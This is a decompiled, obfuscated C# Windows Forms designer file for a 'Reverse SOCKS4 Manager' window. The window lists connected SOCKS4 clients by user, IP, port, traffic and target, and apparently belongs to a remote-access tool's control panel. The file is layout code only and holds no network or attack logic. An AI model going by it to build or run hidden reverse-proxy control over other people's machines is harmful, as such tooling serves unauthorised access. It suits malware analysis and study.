﻿// Token: 0x0200019F RID: 415
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public sealed partial class fSocks4R : global::System.Windows.Forms.Form
{
	// Token: 0x060016E9 RID: 5865 RVA: 0x000A9D34 File Offset: 0x000A7F34
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x060016EA RID: 5866 RVA: 0x000A9D74 File Offset: 0x000A7F74
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.icontainer_0 = new global::System.ComponentModel.Container();
		this.vmethod_1(new global::VisualPlus.Toolkit.Controls.Interactivity.VisualButton());
		this.vmethod_3(new global::System.ComponentModel.BackgroundWorker());
		this.vmethod_5(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_7(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_9(new global::System.Windows.Forms.ToolStripSeparator());
		this.vmethod_11(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_13(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_15(new global::System.Windows.Forms.ToolStripSeparator());
		this.vmethod_17(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_19(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_57(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_59(new global::System.Windows.Forms.ToolStripSeparator());
		this.vmethod_53(new global::System.Windows.Forms.ToolStripSeparator());
		this.vmethod_55(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_21(new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0));
		this.vmethod_23(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_27(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_29(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_31(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_33(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_35(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_37(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_39(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_41(new global::System.Windows.Forms.ToolStripStatusLabel());
		this.vmethod_43(new global::System.Windows.Forms.StatusStrip());
		this.vmethod_51(new global::System.Windows.Forms.ToolStripStatusLabel());
		this.vmethod_45(new global::System.Windows.Forms.Timer(this.icontainer_0));
		this.vmethod_47(new global::BrightIdeasSoftware.OLVColumn());
		this.vmethod_49(new global::BrightIdeasSoftware.FastObjectListView());
		this.vmethod_63(new global::System.Windows.Forms.PictureBox());
		this.vmethod_61(new global::System.Windows.Forms.PictureBox());
		this.vmethod_25(new global::System.Windows.Forms.PictureBox());
		this.vmethod_20().SuspendLayout();
		this.vmethod_42().SuspendLayout();
		this.vmethod_48().BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.vmethod_62()).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.vmethod_60()).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.vmethod_24()).BeginInit();
		base.SuspendLayout();
		this.vmethod_0().Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left);
		this.vmethod_0().BackColorState.Disabled = global::System.Drawing.Color.FromArgb(224, 224, 224);
		this.vmethod_0().BackColorState.Enabled = global::System.Drawing.Color.FromArgb(220, 220, 220);
		this.vmethod_0().BackColorState.Hover = global::System.Drawing.Color.FromArgb(224, 224, 224);
		this.vmethod_0().BackColorState.Pressed = global::System.Drawing.Color.FromArgb(192, 192, 192);
		this.vmethod_0().Border.Color = global::System.Drawing.Color.FromArgb(180, 180, 180);
		this.vmethod_0().Border.HoverColor = global::System.Drawing.Color.FromArgb(120, 183, 230);
		this.vmethod_0().Border.HoverVisible = true;
		this.vmethod_0().Border.Rounding = 6;
		this.vmethod_0().Border.Thickness = 1;
		this.vmethod_0().Border.Type = 1;
		this.vmethod_0().Border.Visible = true;
		this.vmethod_0().DialogResult = global::System.Windows.Forms.DialogResult.None;
		this.vmethod_0().ForeColor = global::System.Drawing.Color.FromArgb(0, 0, 0);
		this.vmethod_0().Image = null;
		this.vmethod_0().Location = new global::System.Drawing.Point(10, 306);
		this.vmethod_0().MouseState = 0;
		this.vmethod_0().Name = "btnStartStop";
		this.vmethod_0().Size = new global::System.Drawing.Size(61, 30);
		this.vmethod_0().TabIndex = 103;
		this.vmethod_0().Text = "Start";
		this.vmethod_0().TextImageRelation = global::System.Windows.Forms.TextImageRelation.Overlay;
		this.vmethod_0().TextStyle.Disabled = global::System.Drawing.Color.FromArgb(131, 129, 129);
		this.vmethod_0().TextStyle.Enabled = global::System.Drawing.Color.FromArgb(0, 0, 0);
		this.vmethod_0().TextStyle.Hover = global::System.Drawing.Color.FromArgb(0, 0, 0);
		this.vmethod_0().TextStyle.Pressed = global::System.Drawing.Color.FromArgb(0, 0, 0);
		this.vmethod_0().TextStyle.TextAlignment = global::System.Drawing.StringAlignment.Center;
		this.vmethod_0().TextStyle.TextLineAlignment = global::System.Drawing.StringAlignment.Center;
		this.vmethod_0().TextStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.vmethod_4().Name = "AllToolStripMenuItem";
		this.vmethod_4().Size = new global::System.Drawing.Size(118, 22);
		this.vmethod_4().Text = "All";
		this.vmethod_6().Name = "SelectedToolStripMenuItem";
		this.vmethod_6().Size = new global::System.Drawing.Size(118, 22);
		this.vmethod_6().Text = "Selected";
		this.vmethod_8().Name = "ToolStripMenuItem1";
		this.vmethod_8().Size = new global::System.Drawing.Size(115, 6);
		this.vmethod_10().Name = "IPPortToolStripMenuItem";
		this.vmethod_10().Size = new global::System.Drawing.Size(118, 22);
		this.vmethod_10().Text = "Port";
		this.vmethod_12().DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.vmethod_10(),
			this.vmethod_8(),
			this.vmethod_6(),
			this.vmethod_4()
		});
		this.vmethod_12().Name = "CopyToClipboardToolStripMenuItem";
		this.vmethod_12().Size = new global::System.Drawing.Size(169, 22);
		this.vmethod_12().Text = "Copy to clipboard";
		this.vmethod_14().Name = "ToolStripMenuItem2";
		this.vmethod_14().Size = new global::System.Drawing.Size(166, 6);
		this.vmethod_16().Name = "StopToolStripMenuItem";
		this.vmethod_16().Size = new global::System.Drawing.Size(150, 22);
		this.vmethod_16().Text = "Stop";
		this.vmethod_18().DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.vmethod_56(),
			this.vmethod_58(),
			this.vmethod_16(),
			this.vmethod_52(),
			this.vmethod_54()
		});
		this.vmethod_18().Name = "OperationsToolStripMenuItem";
		this.vmethod_18().Size = new global::System.Drawing.Size(169, 22);
		this.vmethod_18().Text = "Operations";
		this.vmethod_56().Name = "ShowTargetToolStripMenuItem";
		this.vmethod_56().Size = new global::System.Drawing.Size(150, 22);
		this.vmethod_56().Text = "Show target";
		this.vmethod_58().Name = "ToolStripMenuItem4";
		this.vmethod_58().Size = new global::System.Drawing.Size(147, 6);
		this.vmethod_52().Name = "ToolStripMenuItem3";
		this.vmethod_52().Size = new global::System.Drawing.Size(147, 6);
		this.vmethod_54().Name = "ResetStatisticsToolStripMenuItem";
		this.vmethod_54().Size = new global::System.Drawing.Size(150, 22);
		this.vmethod_54().Text = "Reset statistics";
		this.vmethod_20().ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.vmethod_20().Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.vmethod_18(),
			this.vmethod_14(),
			this.vmethod_12()
		});
		this.vmethod_20().Name = "ContextMenuStrip1";
		this.vmethod_20().Size = new global::System.Drawing.Size(170, 54);
		this.vmethod_22().AspectName = "DURATION";
		this.vmethod_22().Hideable = false;
		this.vmethod_22().Text = "Duration";
		this.vmethod_26().AspectName = "TARGET";
		this.vmethod_26().Hideable = false;
		this.vmethod_26().Text = "Target";
		this.vmethod_28().AspectName = "SPEED_DL";
		this.vmethod_28().Hideable = false;
		this.vmethod_28().Text = "DL";
		this.vmethod_30().AspectName = "RECV";
		this.vmethod_30().Hideable = false;
		this.vmethod_30().Text = "Received";
		this.vmethod_32().AspectName = "SENT";
		this.vmethod_32().Hideable = false;
		this.vmethod_32().Text = "Sent";
		this.vmethod_34().AspectName = "PORT";
		this.vmethod_34().Hideable = false;
		this.vmethod_34().Text = "Port";
		this.vmethod_36().AspectName = "USER";
		this.vmethod_36().Hideable = false;
		this.vmethod_36().Text = "User";
		this.vmethod_38().AspectName = "IP";
		this.vmethod_38().Hideable = false;
		this.vmethod_38().Text = "IP";
		this.vmethod_40().AutoSize = false;
		this.vmethod_40().BorderSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.All;
		this.vmethod_40().BorderStyle = global::System.Windows.Forms.Border3DStyle.SunkenOuter;
		this.vmethod_40().Margin = new global::System.Windows.Forms.Padding(0, 3, -4, 0);
		this.vmethod_40().Name = "tsSocks4RCount";
		this.vmethod_40().Size = new global::System.Drawing.Size(150, 16);
		this.vmethod_40().Text = "Active Socks4 clients: 0";
		this.vmethod_40().TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
		this.vmethod_42().AutoSize = false;
		this.vmethod_42().BackColor = global::System.Drawing.Color.FromArgb(235, 237, 239);
		this.vmethod_42().ImageScalingSize = new global::System.Drawing.Size(28, 28);
		this.vmethod_42().Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.vmethod_50(),
			this.vmethod_40()
		});
		this.vmethod_42().Location = new global::System.Drawing.Point(0, 338);
		this.vmethod_42().Name = "ssTransferStatus";
		this.vmethod_42().Padding = new global::System.Windows.Forms.Padding(1, 0, 7, 0);
		this.vmethod_42().Size = new global::System.Drawing.Size(884, 19);
		this.vmethod_42().SizingGrip = false;
		this.vmethod_42().Stretch = false;
		this.vmethod_42().TabIndex = 95;
		this.vmethod_42().Text = "stStatus";
		this.vmethod_50().AutoSize = false;
		this.vmethod_50().BorderSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.All;
		this.vmethod_50().BorderStyle = global::System.Windows.Forms.Border3DStyle.SunkenOuter;
		this.vmethod_50().Margin = new global::System.Windows.Forms.Padding(0, 3, 0, 0);
		this.vmethod_50().Name = "tsSocks4RStatus";
		this.vmethod_50().Size = new global::System.Drawing.Size(730, 16);
		this.vmethod_50().Spring = true;
		this.vmethod_50().Text = "Status: N/A";
		this.vmethod_50().TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
		this.vmethod_44().Enabled = true;
		this.vmethod_44().Interval = 1000;
		this.vmethod_46().AspectName = "SPEED_UL";
		this.vmethod_46().Hideable = false;
		this.vmethod_46().Text = "UL";
		this.vmethod_48().Alignment = global::System.Windows.Forms.ListViewAlignment.Left;
		this.vmethod_48().AllColumns.Add(this.vmethod_36());
		this.vmethod_48().AllColumns.Add(this.vmethod_38());
		this.vmethod_48().AllColumns.Add(this.vmethod_34());
		this.vmethod_48().AllColumns.Add(this.vmethod_32());
		this.vmethod_48().AllColumns.Add(this.vmethod_30());
		this.vmethod_48().AllColumns.Add(this.vmethod_28());
		this.vmethod_48().AllColumns.Add(this.vmethod_46());
		this.vmethod_48().AllColumns.Add(this.vmethod_26());
		this.vmethod_48().AllColumns.Add(this.vmethod_22());
		this.vmethod_48().Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.vmethod_48().AutoArrange = false;
		this.vmethod_48().BorderStyle = global::System.Windows.Forms.BorderStyle.None;
		this.vmethod_48().CellEditUseWholeCell = false;
		this.vmethod_48().Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
		{
			this.vmethod_36(),
			this.vmethod_38(),
			this.vmethod_34(),
			this.vmethod_32(),
			this.vmethod_30(),
			this.vmethod_28(),
			this.vmethod_46(),
			this.vmethod_26(),
			this.vmethod_22()
		});
		this.vmethod_48().ContextMenuStrip = this.vmethod_20();
		this.vmethod_48().Cursor = global::System.Windows.Forms.Cursors.Default;
		this.vmethod_48().Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.142858f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.vmethod_48().FullRowSelect = true;
		this.vmethod_48().HeaderStyle = global::System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
		this.vmethod_48().HideSelection = false;
		this.vmethod_48().Location = new global::System.Drawing.Point(0, 0);
		this.vmethod_48().Margin = new global::System.Windows.Forms.Padding(1);
		this.vmethod_48().Name = "lvSocks4Clients";
		this.vmethod_48().ShowGroups = false;
		this.vmethod_48().Size = new global::System.Drawing.Size(884, 302);
		this.vmethod_48().TabIndex = 94;
		this.vmethod_48().UseCompatibleStateImageBehavior = false;
		this.vmethod_48().UseHotControls = false;
		this.vmethod_48().UseOverlays = false;
		this.vmethod_48().View = global::System.Windows.Forms.View.Details;
		this.vmethod_48().VirtualMode = true;
		this.vmethod_62().Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right);
		this.vmethod_62().Image = global::Class131.smethod_4();
		this.vmethod_62().Location = new global::System.Drawing.Point(839, 314);
		this.vmethod_62().Margin = new global::System.Windows.Forms.Padding(2);
		this.vmethod_62().Name = "pbWarning";
		this.vmethod_62().Size = new global::System.Drawing.Size(15, 15);
		this.vmethod_62().SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.vmethod_62().TabIndex = 105;
		this.vmethod_62().TabStop = false;
		this.vmethod_60().Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right);
		this.vmethod_60().Image = global::Class131.smethod_17();
		this.vmethod_60().Location = new global::System.Drawing.Point(858, 314);
		this.vmethod_60().Margin = new global::System.Windows.Forms.Padding(2);
		this.vmethod_60().Name = "pbHelp";
		this.vmethod_60().Size = new global::System.Drawing.Size(15, 15);
		this.vmethod_60().SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.vmethod_60().TabIndex = 104;
		this.vmethod_60().TabStop = false;
		this.vmethod_24().Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left);
		this.vmethod_24().Image = global::Class131.smethod_24();
		this.vmethod_24().Location = new global::System.Drawing.Point(76, 314);
		this.vmethod_24().Margin = new global::System.Windows.Forms.Padding(2);
		this.vmethod_24().Name = "pbPInfo";
		this.vmethod_24().Size = new global::System.Drawing.Size(15, 15);
		this.vmethod_24().SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.vmethod_24().TabIndex = 102;
		this.vmethod_24().TabStop = false;
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new global::System.Drawing.Size(884, 357);
		base.Controls.Add(this.vmethod_62());
		base.Controls.Add(this.vmethod_60());
		base.Controls.Add(this.vmethod_0());
		base.Controls.Add(this.vmethod_24());
		base.Controls.Add(this.vmethod_42());
		base.Controls.Add(this.vmethod_48());
		this.DoubleBuffered = true;
		base.Name = "fSocks4R";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "Reverse SOCKS4 Manager";
		this.vmethod_20().ResumeLayout(false);
		this.vmethod_42().ResumeLayout(false);
		this.vmethod_42().PerformLayout();
		this.vmethod_48().EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.vmethod_62()).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.vmethod_60()).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.vmethod_24()).EndInit();
		base.ResumeLayout(false);
	}

	// Token: 0x040008A2 RID: 2210
	private global::System.ComponentModel.IContainer icontainer_0;
}
